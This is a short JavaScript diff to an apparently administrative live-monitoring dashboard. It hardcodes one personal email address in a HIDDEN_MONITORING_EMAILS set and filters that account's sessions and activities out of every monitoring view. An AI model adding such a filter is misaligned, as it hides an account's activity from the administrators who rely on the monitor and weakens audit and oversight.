@@ -6,6 +6,7 @@
   const OFFLINE_AFTER_MS = 120000;
   const HEARTBEAT_MS = 25000;
   const REFRESH_MS = 30000;
+  const HIDDEN_MONITORING_EMAILS = new Set(['ahmadpajarpirmansah099@gmail.com']);
 
   let client = null;
   let context = null;
@@ -632,9 +633,15 @@
       ]);
 
       if (sessionResult.error) throw sessionResult.error;
-      renderLiveUsers(sessionResult.data || []);
-      renderActivity(activityResult || []);
-      renderSummary(sessionResult.data || [], activityResult || []);
+      const visibleSessions = (sessionResult.data || []).filter((session) =>
+        !HIDDEN_MONITORING_EMAILS.has(String(session.user_email || '').trim().toLowerCase())
+      );
+      const visibleActivities = (activityResult || []).filter((activity) =>
+        !HIDDEN_MONITORING_EMAILS.has(String(activity.actor_email || '').trim().toLowerCase())
+      );
+      renderLiveUsers(visibleSessions);
+      renderActivity(visibleActivities);
+      renderSummary(visibleSessions, visibleActivities);
       const updated = $('monitorLastUpdated');
       if (updated) updated.textContent = 'Diperbarui ' + new Intl.DateTimeFormat('id-ID', {
         hour: '2-digit', minute: '2-digit', second: '2-digit'
